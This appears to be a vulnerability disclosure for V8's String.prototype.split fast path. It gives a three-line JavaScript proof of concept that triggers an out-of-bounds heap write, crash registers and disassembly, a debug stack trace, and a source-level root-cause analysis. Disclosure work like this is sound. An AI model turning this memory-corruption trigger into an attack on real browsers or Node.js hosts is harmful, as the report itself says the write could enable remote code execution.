This vulnerability exists in 64-bit v8 in the String.p.slit CSA code. The allocation size is stored in int64 but improperly casted to smi which causes the allocated space too small and OOB write. It may potentially lead to remote code execution.

POC
var str2 = String.fromCharCode(0x2c);//add `,` into single character string cache
var o2 = new Array(0x20000000);
String.prototype.split.call(o2,'');

CRASH LOG
When the release version crashes, the registers and nearby assembly code are as follows.
[─────────────────────────────────────REGISTERS─────────────────────────────────────]
*RAX  0xffffffff <-- large offset
*RBX  0xc789cc82801 ◂— 0xff00000c789cc828 <-- value we can partially control
 RCX  0x14e781f02201 ◂— 0xc789cc823 <-- points to a FixedArray
 RDX  0xbd5f161fe3430800
 RDI  0x20
 RSI  0x1
 R8   0x9fb0e203439 ◂— 0xc789cc823
 R9   0x2c
 R10  0x7fff309962d8 ◂— 0x0
 R11  0x1
 R12  0x309cad302201 ◂— 0x300000c789cc82b
 R13  0x55d1aba3f478 —▸ 0xc789cc82ba9 ◂— 0xc789cc822
 R14  0x0
 R15  0x7fff309962d0 —▸ 0x7fff309962d8 ◂— 0x0
 RBP  0x7fff30996368 —▸ 0x7fff309963d0 —▸ 0x7fff309963f8 —▸ 0x7fff30996460 ◂— ...
 RSP  0x7fff309962d8 ◂— 0x0
*RIP  0x2b7d8e092d8a ◂— mov    qword ptr [rax + rcx], rbx
[──────────────────────────────────────DISASM───────────────────────────────────────]
   0x2b7d8e092d74    cmp    rax, 0xf
   0x2b7d8e092d78    je     0x2b7d8e091e4d

   0x2b7d8e092d7e    mov    rbx, qword ptr [r13 - 0x58]
   0x2b7d8e092d82    mov    rcx, qword ptr [rbp - 0x40]
   0x2b7d8e092d86    sub    rax, 8
 ► 0x2b7d8e092d8a    mov    qword ptr [rax + rcx], rbx <-- OOB Write here!!
   0x2b7d8e092d8e    cmp    rax, 0xf
   0x2b7d8e092d92    jne    0x2b7d8e092d86

If it is Debug version, it will crash in the DCHECK code.
#
# Fatal error in ../../src/heap/heap-inl.h, line 178
# Debug check failed: large_object.
#
#
#
#FailureMessage Object: 0x7ffee72a7da0
==== C stack trace ===============================

    0   libv8_libbase.dylib                 0x000000010f1decde v8::base::debug::StackTrace::StackTrace() + 30
    1   libv8_libbase.dylib                 0x000000010f1ded45 v8::base::debug::StackTrace::StackTrace() + 21
    2   libv8_libplatform.dylib             0x000000010f27202f v8::platform::(anonymous namespace)::PrintStackTrace() + 223
    3   libv8_libbase.dylib                 0x000000010f1a4069 V8_Fatal(char const*, int, char const*, ...) + 841
    4   libv8_libbase.dylib                 0x000000010f1a350a v8::base::(anonymous namespace)::DefaultDcheckHandler(char const*, int, char const*) + 74
    5   libv8_libbase.dylib                 0x000000010f1a4122 V8_Dcheck(char const*, int, char const*) + 50
    6   libv8.dylib                         0x000000010abb3510 v8::internal::Heap::AllocateRaw(int, v8::internal::AllocationSpace, v8::internal::AllocationAlignment) + 2912
    7   libv8.dylib                         0x000000010acab5a6 v8::internal::Heap::AllocateRawWithLigthRetry(int, v8::internal::AllocationSpace, v8::internal::AllocationAlignment) + 390
    8   libv8.dylib                         0x000000010acabb18 v8::internal::Heap::AllocateRawWithRetryOrFail(int, v8::internal::AllocationSpace, v8::internal::AllocationAlignment) + 408
    9   libv8.dylib                         0x000000010abab4ff v8::internal::Factory::NewFillerObject(int, bool, v8::internal::AllocationSpace) + 383
    10  libv8.dylib                         0x000000010bd83cb0 v8::internal::__RT_impl_Runtime_AllocateInTargetSpace(v8::internal::Arguments, v8::internal::Isolate*) + 2192
    11  libv8.dylib                         0x000000010bd82ee3 v8::internal::Runtime_AllocateInTargetSpace(int, v8::internal::Object**, v8::internal::Isolate*) + 771
    12  ???                                 0x00007ed4b8233cc4 0x0 + 139452087483588
Received signal 4 <unknown> 00010f1d4ce6

<b>VULNERABILITY DETAILS</b>
In the String.p.slipt function, the StringToArray function is called if the second parameter is an empty string

TNode<JSArray> StringBuiltinsAssembler::StringToArray(
    TNode<Context> context, TNode<String> subject_string,
    TNode<Smi> subject_length, TNode<Number> limit_number) {
  //...

  TNode<Int32T> instance_type = LoadInstanceType(subject_string);
  GotoIfNot(IsOneByteStringInstanceType(instance_type), &call_runtime);

  // Try to use cached one byte characters.
  {
    // Go to fast path
    TNode<Smi> length_smi =
        Select<Smi>(TaggedIsSmi(limit_number),
                    [=] { return SmiMin(CAST(limit_number), subject_length); },
                    [=] { return subject_length; });
    TNode<IntPtrT> length = SmiToIntPtr(length_smi);

    ToDirectStringAssembler to_direct(state(), subject_string);
    to_direct.TryToDirect(&call_runtime);
    TNode<FixedArray> elements = AllocateFixedArray(
        PACKED_ELEMENTS, length, AllocationFlag::kAllowLargeObjectAllocation);

Because it is OneByteString, it will call AllocateFixedArray to allocate elements, code of AllocateFixedArray  is as follows.

TNode<FixedArray> CodeStubAssembler::AllocateFixedArray(
    ElementsKind kind, Node* capacity, ParameterMode mode,
    AllocationFlags flags, SloppyTNode<Map> fixed_array_map) {
  Comment("AllocateFixedArray");
  CSA_SLOW_ASSERT(this, MatchesParameterMode(capacity, mode));
  CSA_ASSERT(this, IntPtrOrSmiGreaterThan(capacity,
                                          IntPtrOrSmiConstant(0, mode), mode));
  TNode<IntPtrT> total_size = GetFixedArrayAllocationSize(capacity, kind, mode);

  if (IsDoubleElementsKind(kind)) flags |= kDoubleAlignment;
  // Allocate both array and elements object, and initialize the JSArray.
  Node* array = Allocate(total_size, flags);

totol_size calculated by GetFixedArrayAllocationSize is 0x100000008, then call Allocate function, and then call AllocateRawDoubleAligned function, AllocateRaw function. The partial code of AllocateRaw function is as follows. 

  if (flags & kAllowLargeObjectAllocation) {
    Label next(this);
    GotoIf(IsRegularHeapObjectSize(size_in_bytes), &next);

    Node* runtime_flags = SmiConstant(
        Smi::FromInt(AllocateDoubleAlignFlag::encode(needs_double_alignment) |
                     AllocateTargetSpace::encode(AllocationSpace::LO_SPACE)));
    Node* const runtime_result =
        CallRuntime(Runtime::kAllocateInTargetSpace, NoContextConstant(),
                    SmiTag(size_in_bytes), runtime_flags);

IsRegularHeapObjectSize (size_in_bytes) returns true, and then call the Runtime function AllocateInTargetSpace, but the second parameter uses SmiTag for type conversion, SmiTag code is as follows

TNode<Smi> CodeStubAssembler::SmiTag(SloppyTNode<IntPtrT> value) {
  int32_t constant_value;
  if (ToInt32Constant(value, constant_value) && Smi::IsValid(constant_value)) {
    return SmiConstant(constant_value);
  }
  return BitcastWordToTaggedSigned(WordShl(value, SmiShiftBitsConstant()));
}

Although the function ToInt32Constant has a value range for determining value, it is not safe to call BitcastWordToTaggedSigned after this function. After the conversion, the size becomes 0x8 (smi). Finally, object is allocated in the LargeObjectSpace. However, the allocated space is obviously too small, and it will cause an out-of-bounds write when the Array elements are initialized which may leads to remote code execution.


